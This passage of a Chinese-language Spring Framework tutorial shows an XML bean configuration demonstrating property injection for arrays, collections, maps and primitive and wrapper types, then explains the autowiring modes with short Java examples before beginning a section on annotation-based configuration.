class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">       http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- 1. 声明 QianDaYe Bean 对象 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> </span><br><span class="hljs-tag">        <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myBean&quot;</span> </span><br><span class="hljs-tag">        <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.example.MyBean&quot;</span> </span><br><span class="hljs-tag">        <span class="hljs-attr">lazy-init</span>=<span class="hljs-string">&quot;true&quot;</span> </span><br><span class="hljs-tag">        <span class="hljs-attr">scope</span>=<span class="hljs-string">&quot;prototype&quot;</span> </span><br><span class="hljs-tag">        <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;initMethod&quot;</span> </span><br><span class="hljs-tag">        <span class="hljs-attr">destroy-method</span>=<span class="hljs-string">&quot;cleanup&quot;</span> </span><br><span class="hljs-tag">        <span class="hljs-attr">factory-bean</span>=<span class="hljs-string">&quot;myFactoryBean&quot;</span> </span><br><span class="hljs-tag">        <span class="hljs-attr">factory-method</span>=<span class="hljs-string">&quot;createInstance&quot;</span> </span><br><span class="hljs-tag">        <span class="hljs-attr">autowire</span>=<span class="hljs-string">&quot;byName&quot;</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!-- 2. 配置 Bean 对象的依赖关系 --&gt;</span><br>        <br>        <span class="hljs-comment">&lt;!-- 2.1 对象类型 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;userDao&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;userDao&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bankDao&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;bankDao&quot;</span> /&gt;</span><br>        <br>        <span class="hljs-comment">&lt;!-- 2.2 简单数组 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;simpleArray&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">array</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>25<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span> <br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>30<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>35<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>        <br>        <span class="hljs-comment">&lt;!-- 2.3 二维数组 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;twoDimArray&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">array</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">array</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>25<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>30<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">array</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>35<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>40<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>        <br>        <span class="hljs-comment">&lt;!-- 2.4 简单 List 集合 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;simpleList&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>25<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>30<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>35<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>        <br>        <span class="hljs-comment">&lt;!-- 2.5 复杂 List 集合 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;complexList&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>Object1<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>Object2<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>        <br>        <span class="hljs-comment">&lt;!-- 2.6 简单 Set 集合 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;simpleSet&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">set</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>25<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>30<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">set</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!-- 2.7 复杂 Set 集合 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;complexSet&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">set</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>Object1<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>Object2<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">set</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>        <br>        <span class="hljs-comment">&lt;!-- 2.8 简单 Map 集合 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;simpleMap&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">map</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">entry</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;age1&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;25&quot;</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">entry</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;age2&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;30&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">map</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>        <br>        <span class="hljs-comment">&lt;!-- 2.9 复杂 Map 集合 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;complexMap&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">map</span>&gt;</span><br>                <span class="hljs-comment">&lt;!-- 2.9.1 值是对象 --&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">entry</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;AnotherBean&quot;</span> /&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span><br><br>                <span class="hljs-comment">&lt;!-- 2.9.2 值是 List 集合 --&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">entry</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>Item1<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>Item2<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>Item3<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">ref</span> <span class="hljs-attr">bean</span>=<span class="hljs-string">&quot;bean1&quot;</span> /&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">ref</span> <span class="hljs-attr">bean</span>=<span class="hljs-string">&quot;bean2&quot;</span> /&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">ref</span> <span class="hljs-attr">bean</span>=<span class="hljs-string">&quot;bean3&quot;</span> /&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span><br><br>                <span class="hljs-comment">&lt;!-- 2.9.3 值是 Set 集合 --&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">entry</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;6&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">set</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>Value1<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>Value2<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>Value3<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">ref</span> <span class="hljs-attr">bean</span>=<span class="hljs-string">&quot;bean1&quot;</span> /&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">ref</span> <span class="hljs-attr">bean</span>=<span class="hljs-string">&quot;bean2&quot;</span> /&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">ref</span> <span class="hljs-attr">bean</span>=<span class="hljs-string">&quot;bean3&quot;</span> /&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">set</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">map</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>        <br>        <span class="hljs-comment">&lt;!-- 2.10 注入简单数据类型 --&gt;</span><br>        <span class="hljs-comment">&lt;!-- 2.10.1 基本数据类型 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;simpleInt&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;25&quot;</span> /&gt;</span> <span class="hljs-comment">&lt;!-- int 类型 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;simpleBoolean&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span> /&gt;</span> <span class="hljs-comment">&lt;!-- boolean 类型 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;simpleDouble&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;99.99&quot;</span> /&gt;</span> <span class="hljs-comment">&lt;!-- double 类型 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;simpleChar&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;A&quot;</span> /&gt;</span> <span class="hljs-comment">&lt;!-- char 类型 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;simpleLong&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1000L&quot;</span> /&gt;</span> <span class="hljs-comment">&lt;!-- long 类型 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;simpleFloat&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;3.14&quot;</span> /&gt;</span> <span class="hljs-comment">&lt;!-- float 类型 --&gt;</span><br><br>        <span class="hljs-comment">&lt;!-- 2.10.2 包装类型 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;wrapperInteger&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;30&quot;</span> /&gt;</span> <span class="hljs-comment">&lt;!-- Integer 类型 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;wrapperBoolean&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;false&quot;</span> /&gt;</span> <span class="hljs-comment">&lt;!-- Boolean 类型 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;wrapperDouble&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;200.50&quot;</span> /&gt;</span> <span class="hljs-comment">&lt;!-- Double 类型 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;wrapperCharacter&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;B&quot;</span> /&gt;</span> <span class="hljs-comment">&lt;!-- Character 类型 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;wrapperLong&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;5000&quot;</span> /&gt;</span> <span class="hljs-comment">&lt;!-- Long 类型 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;wrapperFloat&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;2.71&quot;</span> /&gt;</span> <span class="hljs-comment">&lt;!-- Float 类型 --&gt;</span><br><br>        <span class="hljs-comment">&lt;!-- 2.10.3 字符串类型 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;stringValue&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;John Doe&quot;</span> /&gt;</span> <span class="hljs-comment">&lt;!-- String 类型 --&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- 声明其他 Bean 对象 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.example.bean.QianDaYe&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;qianDaYe&quot;</span> /&gt;</span><br>    <br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h6 id="1-4-2-4、采用自动装配"><a href="#1-4-2-4、采用自动装配" class="headerlink" title="1.4.2.4、采用自动装配"></a>1.4.2.4、采用自动装配</h6><p>&#x3D;&#x3D;1.为 Bean 类增添有参构造方法和 Setter 方法&#x3D;&#x3D;</p><p>&#x3D;&#x3D;2.声明 Bean 对象，并配置该对象的属性注入&#x3D;&#x3D;<br>Spring 提供了五种主要的自动装配模式，这些模式包括：<code>no</code>（默认）、<code>byName</code>、<code>byType</code>、<code>constructor</code>、<code>autodetect</code>。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">       http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;foo&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.example.Foo&quot;</span> <span class="hljs-attr">autowire</span>=<span class="hljs-string">&quot;autodetect&quot;</span>/&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><ol><li><p><font color="#00b0f0">no（默认）</font><br>默认情况下，Spring 不会进行自动装配，需要我们手动注入依赖，例如通过构造方法注入或 Setter 注入</p></li><li><p><font color="#00b0f0">byName</font><br>使用这种方式，Spring 会查找系统中与<strong>属性名相同</strong>的组件，自动进行注入。这种方式基于 Setter 注入，所以要为属性提供 Setter 方法</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Bar</span> bar;  <span class="hljs-comment">// 看 bar</span><br><br>    <span class="hljs-comment">// Setter</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setBar</span>(<span class="hljs-params"><span class="hljs-title class_">Bar</span> bar</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = bar;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><font color="#00b0f0">byType</font><br>使用这种方式，Spring 会查找系统中与属性<strong>类型相同</strong>的组件，自动进行注入。这种方式基于 Setter 注入，所以要为属性提供 Setter 方法</p></li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Bar</span> bar;  <span class="hljs-comment">// 看 Bar</span><br><br>    <span class="hljs-comment">// Setter</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setBar</span>(<span class="hljs-params"><span class="hljs-title class_">Bar</span> bar</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = bar;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意：</p><ol><li>如果系统中存在多个属性类型匹配的组件，Spring 会无法决定注入那个组件，就会抛出 <code>NoUniqueBeanDefinitonException</code> 异常。</li><li>通过标记主要候选者可以解决此问题，例如：<br><code>&lt;bean id=&quot;primaryBar&quot; class=&quot;com.example.Bar&quot; primary=&quot;true&quot;/&gt;</code> 或在 Bean 类上使用 <code>@Primary</code> 注解。</li></ol></blockquote><ol start="4"><li><font color="#00b0f0">constructor</font><br>使用这种方式，Spring 会自动查找系统中与构造函数参数<strong>类型匹配</strong>的组件，自动进行注入。这种方式基于构造方法注入，所以要为属性提供构造方法<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span> &#123;<br>    <span class="hljs-keyword">private</span> Bar bar;<br><br>    <span class="hljs-comment">// 构造方法</span><br>    <span class="hljs-keyword">public</span> Foo(Bar bar) &#123; <span class="hljs-comment">// 看这里的 Bar</span><br>        <span class="hljs-keyword">this</span>.bar = bar;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><blockquote><p>[!NOTE] 注意<br>如果有多个构造函数，Spring 会选择参数最多的那个（前提是所有参数类型都能在容器中找到对应的 bean）。</p></blockquote><ol start="5"><li><font color="#00b0f0">autodetect</font><br>使用这种方式，Spring 会首先尝试通过 constructor 方式进行注入，如果失败，则使用 byType 方式。这种方式基于 Setter 注入和 构造注入，所以既要为属性提供 Setter 方法又要为属性提供构造方法<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Foo</span> &#123;<br>    <span class="hljs-keyword">private</span> Bar bar;<br><br>    <span class="hljs-comment">// 构造方法</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Foo</span>()</span> &#123;<br>        <span class="hljs-comment">// Default constructor</span><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Foo</span>(<span class="hljs-params">Bar bar</span>)</span> &#123;<br>        <span class="hljs-keyword">this</span>.bar = bar;<br>    &#125;<br><br>    <span class="hljs-comment">// Setter</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setBar</span>(<span class="hljs-params">Bar bar</span>)</span> &#123;<br>        <span class="hljs-keyword">this</span>.bar = bar;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><hr><h5 id="1-4-3、配置方式2：注解-扫描-配置方式"><a href="#1-4-3、配置方式2：注解-扫描-配置方式" class="headerlink" title="1.4.3、配置方式2：注解 + 扫描 配置方式"></a>1.4.3、配置方式2：注解 + 扫描 配置方式</h5><h6 id="1-4-3-1、声明-Bean-对象"><a href="#1-4-3-1、声明-Bean-对象" class="headerlink" title="1.4.3.1、声明 Bean 对象"></a>1.4.3.1、声明 Bean 对象</h6><p>在类上标注 <code>@Component</code> 及其衍生注解（如 <code>@Service</code>, <code>@Repository</code>, <code>@Controller</code>），以指示该类是一个 Bean类并声明唯一个Bean 对象。</p><ul><li><code>@Component</code>：标注通用组件</li><li><code>@Service</code>：标注业务逻辑层（service 层）</li><li><code>@Repository</code>：标注数据访问层（dao 层、mapper 层）</li><li><code>@Controller</code>：标注表现层（Web 层）</li><li><code>@RestController</code>：<code>@RestController</code> &#x3D; <code>@Controller</code> + <code>@ResponseBody</code> ，使得每个方法的返回值都直接作为 HTTP 响应体返回。<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 